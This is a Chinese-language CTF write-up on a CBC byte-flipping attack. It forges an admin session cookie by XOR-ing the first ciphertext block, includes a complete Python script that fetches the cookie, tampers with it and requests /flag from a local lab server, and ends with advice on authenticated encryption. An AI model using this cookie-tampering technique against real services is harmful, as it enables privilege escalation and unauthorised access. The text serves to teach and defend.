# WriteUP - A04 Medium: CBC 字节翻转攻击

## 密码学原理

### AES-CBC 模式工作原理

AES-CBC（Cipher Block Chaining，密码块链接）是一种分组密码工作模式：

```
Plaintext:  P1 | P2 | P3 | ...
              ↓  ↓  ↓
IV ──XOR──→ Enc ──→ C1
              ↑
C1 ──XOR──→ Enc ──→ C2
              ↑
C2 ──XOR──→ Enc ──→ C3
```

加密过程：
- $C_1 = Encrypt(P_1 \oplus IV)$
- $C_i = Encrypt(P_i \oplus C_{i-1})$

解密过程：
- $P_1 = Decrypt(C_1) \oplus IV$
- $P_i = Decrypt(C_i) \oplus C_{i-1}$

### CBC 字节翻转攻击核心原理

**关键点**：由于 $P_i = Decrypt(C_i) \oplus C_{i-1}$，如果我们修改 $C_{i-1}$ 的第 $j$ 个字节，$P_i$ 的第 $j$ 个字节也会相应改变！

具体来说：
- 原始：$P_i[j] = Decrypt(C_i)[j] \oplus C_{i-1}[j]$
- 修改 $C_{i-1}'[j] = C_{i-1}[j] \oplus P_i[j] \oplus P_i'[j]$
- 则：$P_i'[j] = Decrypt(C_i)[j] \oplus C_{i-1}'[j] = P_i[j] \oplus P_i[j] \oplus P_i'[j] = P_i'[j]$

**代价**：修改 $C_{i-1}$ 会导致 $P_{i-1}$ 变成完全不可预测的乱码（因为 $C_{i-1}$ 改变后，$Decrypt(C_{i-1})$ 会完全不同）。

### 攻击场景

在本题中：
- Cookie 格式：`iv:ciphertext`（hex 编码）
- 明文（2个块，32字节含填充）：
  - Block 1: `{"user":"guest",`
  - Block 2: `"role":"user"}\x02\x02`

目标：将 `"role":"user"}` 改为 `"role":"admin"}\x01`

通过修改 C1（第1个密文块）的字节，可以控制 P2（第2个明文块）的内容。

## 逐步利用过程

### 步骤 1：获取原始 Cookie

访问首页，获取 Cookie：
```
session=abcdef0123456789...:fedcba9876543210...
```

### 步骤 2：分析明文结构

原始明文分块：
```
Block 1 (P1): {"user":"guest",
Block 2 (P2): "role":"user"}\x02\x02
```

目标 P2：
```
Block 2 (P2'): "role":"admin"}\x01
```

### 步骤 3：计算需要翻转的字节

逐字节对比 P2 和 P2'：

| 位置 | P2 原始 | P2' 目标 | C1 修改量 = 原始 ⊕ 目标 |
|------|---------|----------|------------------------|
| 8    | `u` (0x75) | `a` (0x61) | 0x14 |
| 9    | `s` (0x73) | `d` (0x64) | 0x17 |
| 10   | `e` (0x65) | `m` (0x6d) | 0x08 |
| 11   | `r` (0x72) | `i` (0x69) | 0x1b |
| 12   | `"` (0x22) | `n` (0x6e) | 0x4c |
| 13   | `}` (0x7d) | `"` (0x22) | 0x5f |
| 14   | `\x02`     | `}` (0x7d) | 0x7f |
| 15   | `\x02`     | `\x01`     | 0x03 |

### 步骤 4：构造恶意 Cookie

```python
original_cookie = "iv_hex:ct_hex"
parts = original_cookie.split(':')
iv = bytes.fromhex(parts[0])
c1 = bytes.fromhex(parts[1][:32])  # 第1个密文块
c2 = bytes.fromhex(parts[1][32:])  # 第2个密文块

# 原始 P2
p2 = b'"role":"user"}\x02\x02'
# 目标 P2
p2_target = b'"role":"admin"}\x01'

# 修改 C1
c1_new = bytearray(c1)
for i in range(len(p2)):
    c1_new[i] ^= p2[i] ^ p2_target[i]

new_cookie = iv.hex() + ':' + bytes(c1_new).hex() + c2.hex()
```

### 步骤 5：发送恶意 Cookie 获取 Flag

将修改后的 Cookie 设置到浏览器或使用脚本发送请求到 `/flag`。

## Python 利用脚本

```python
import requests
from urllib.parse import unquote

TARGET = "http://localhost:8080"

# 1. 获取原始 cookie
session = requests.Session()
resp = session.get(TARGET)
cookie = session.cookies.get('session')
print(f"[+] Original cookie: {cookie}")

# 2. 解析 cookie
iv_hex, ct_hex = cookie.split(':')
iv = bytes.fromhex(iv_hex)
ct = bytes.fromhex(ct_hex)

# 分块（AES块大小 = 16）
c1 = ct[:16]
c2 = ct[16:]

# 3. 原始明文块2（已知）
p2 = b'"role":"user"}\x02\x02'
# 4. 目标明文块2
p2_target = b'"role":"admin"}\x01'

# 5. 翻转 C1 的字节
c1_new = bytearray(c1)
for i in range(len(p2)):
    c1_new[i] ^= p2[i] ^ p2_target[i]

# 6. 构造新 cookie
new_ct = bytes(c1_new) + c2
new_cookie = iv.hex() + ':' + new_ct.hex()
print(f"[+] Modified cookie: {new_cookie}")

# 7. 发送请求获取 flag
session2 = requests.Session()
session2.cookies.set('session', new_cookie)
flag_resp = session2.get(f"{TARGET}/flag")
print(flag_resp.text)
```

## 修复建议

1. **使用认证加密（AEAD）**
   - AES-GCM、ChaCha20-Poly1305
   - 提供完整性和机密性保护，任何篡改都会导致认证失败

2. **在密文上附加 MAC/HMAC**
   - Encrypt-then-MAC 模式
   - 验证 MAC 通过后才进行解密

3. **不使用 CBC 模式存储敏感数据**
   - 对于 Cookie/Token，考虑使用签名机制（如 JWT + HMAC）
   - 或完全避免在客户端存储敏感加密数据

4. **如果必须使用 CBC**
   - 实现密文完整性校验
   - 使用 TLS/SSL 传输层保护
